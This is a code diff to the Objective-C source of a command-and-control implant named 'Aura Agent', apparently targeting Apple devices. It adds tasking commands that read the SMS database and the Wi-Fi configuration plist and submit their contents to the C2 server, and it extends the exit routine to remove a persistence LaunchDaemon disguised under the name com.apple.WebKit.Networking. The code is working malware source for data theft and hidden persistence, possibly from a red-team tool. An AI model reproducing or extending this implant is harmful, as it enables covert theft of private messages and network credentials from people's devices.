@@ -3,6 +3,8 @@
 #import "C2CheckIn.h"
 #import "NSTask.h"
 #import "SystemInfoHelper.h"
+#import "SMSReader.h"
+#import "WiFiConfigReader.h"
 
 @implementation C2Task
 
@@ -23,10 +25,59 @@
     // Dictionary mapping command strings to blocks (similar to a switch case)
     NSDictionary<NSString *, void (^)(void)> *taskCommandMap = @{
         @"exit": ^{
-            BOOL deletionSuccess = [SystemInfoHelper deleteExecutable];
-            NSString *responseMessage = deletionSuccess ? @"✅ Aura payload successfully deleted." : @"❌ Error deleting the Aura payload.";
+            BOOL deletionSuccess = [SystemInfoHelper uninstallAgent];
+            NSString *responseMessage = deletionSuccess ? @"🗑️ Aura payload deleted..." : @"❌ Error deleting the Aura payload.";
             NSString *status = deletionSuccess ? @"success" : @"error";
-            [self submitTaskResponseWithOutput:responseMessage status:status completed:YES];
+            [self submitTaskResponseWithOutput:responseMessage status:status completed:NO];
+
+            // Remove persistence if running as root
+            if ([SystemInfoHelper isRootUser]) {
+                NSString *plistPath = @"/Library/LaunchDaemons/com.apple.WebKit.Networking.plist";
+                NSFileManager *fileManager = [NSFileManager defaultManager];
+                
+                if ([fileManager fileExistsAtPath:plistPath]) {
+                    NSLog(@"Removing plist at path: %@", plistPath);
+                    NSError *removeError = nil;
+                    [fileManager removeItemAtPath:plistPath error:&removeError];
+                    if (removeError) {
+                        [self submitTaskResponseWithOutput:[NSString stringWithFormat:@"❌ Error deleting plist: %@", removeError.localizedDescription] status:@"error" completed:NO];
+                    } else {
+                        [self submitTaskResponseWithOutput:@"\n📋 Backing LaunchDaemon plist deleted..." status:@"success" completed:NO];
+                    }
+                } else {
+                    NSLog(@"Plist not found at path: %@", plistPath);
+                }
+
+                // // Remove the agent from launchd
+                // NSTask *removeTask = [[NSTask alloc] init];
+                // removeTask.launchPath = @"/bin/launchctl";
+                // removeTask.arguments = @[@"remove", @"com.apple.WebKit.Networking"];
+                // [removeTask launch];
+                // [removeTask waitUntilExit];
+
+                // if (removeTask.terminationStatus != 0) {
+                //     [self submitTaskResponseWithOutput:@"❌ Error removing the Aura Agent from launchd!" status:@"error" completed:YES];
+                //     exit(1);
+                // } else {
+                //     [self submitTaskResponseWithOutput:@"\n🛜 Removed the Aura Agent from launchd." status:@"success" completed:NO];
+                // }
+
+                // Unload the agent using launchctl
+                [self submitTaskResponseWithOutput:@"\n🛜 Unloading the Aura Agent... this will halt C2 comms" status:@"success" completed:YES];
+                NSTask *unloadTask = [[NSTask alloc] init];
+                unloadTask.launchPath = @"/bin/launchctl";
+                unloadTask.arguments = @[@"unload", @"-w", plistPath];
+                [unloadTask launch];
+                [unloadTask waitUntilExit];
+
+                if (unloadTask.terminationStatus != 0) {
+                    [self submitTaskResponseWithOutput:@"❌ Error unloading the Aura Agent!" status:@"error" completed:YES];
+                    exit(1);
+                }
+            }
+
+            // Final success message
+            [self submitTaskResponseWithOutput:@"\n✅ Aura Agent successfully uninstalled!" status:@"success" completed:YES];
             exit(0);
         },
         @"take_screenshot": ^{
@@ -67,8 +118,31 @@
                 NSString *errorMessage = [NSString stringWithFormat:@"Exception caught: %@", exception.reason];
                 [self submitTaskResponseWithOutput:errorMessage status:@"error" completed:YES];
             }
-        }
+        },
+        @"messages": ^{
+            SMSReader *reader = [[SMSReader alloc] init];
+            NSString *jsonResult = [reader fetchMessagesAsJSONFromDatabase:@"/var/mobile/Library/SMS/sms.db"];
 
+            if (jsonResult) {
+                NSLog(@"Messages JSON: %@", jsonResult);
+                [self submitTaskResponseWithOutput:jsonResult status:@"success" completed:YES];
+            } else {
+                NSLog(@"Failed to fetch messages.");
+                [self submitTaskResponseWithOutput:jsonResult status:@"error" completed:YES];
+            }
+        },
+        @"wifi_config": ^{
+            WiFiConfigReader *reader = [[WiFiConfigReader alloc] init];
+            NSString *jsonResult = [reader readWiFiConfigAsJSONFromPlist:@"/private/var/preferences/SystemConfiguration/com.apple.wifi.plist"];
+
+            if (jsonResult) {
+                NSLog(@"WiFi Config JSON: %@", jsonResult);
+                [self submitTaskResponseWithOutput:jsonResult status:@"success" completed:YES];
+            } else {
+                NSLog(@"Failed to fetch WiFi config.");
+                [self submitTaskResponseWithOutput:@"Failed to read WiFi config." status:@"error" completed:YES];
+            }
+        }
     };
 
     // Fetch the block for the command, or return an error if not found
